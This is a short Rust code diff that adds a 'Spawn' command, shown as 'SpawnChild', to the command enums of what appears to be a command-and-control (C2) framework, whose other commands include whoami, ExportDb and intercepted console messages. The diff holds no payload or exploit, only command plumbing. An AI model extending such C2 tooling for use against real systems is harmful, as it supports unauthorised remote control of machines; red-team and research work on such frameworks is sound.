@@ -53,6 +53,7 @@ pub enum Command {
     WhoAmI,
     /// Messages we intercepted from the console to be sent to the c2
     ConsoleMessages,
+    Spawn,
     // This should be totally unreachable; but keeping to make sure we don't get any weird UB, and
     // make sure it is itemised last in the enum
     Undefined,
@@ -191,6 +192,7 @@ impl Display for Command {
             Command::DotEx => "DotEx",
             Command::ConsoleMessages => "Agent console messages",
             Command::WhoAmI => "whoami",
+            Command::Spawn => "SpawnChild",
         };
 
         write!(f, "{choice}")
@@ -244,6 +246,7 @@ pub enum AdminCommand {
     ExportDb,
     DotEx(DotExInner),
     WhoAmI,
+    Spawn(String),
     /// Used for dispatching no admin command, but to be handled via a custom route on the C2
     None,
     Undefined,
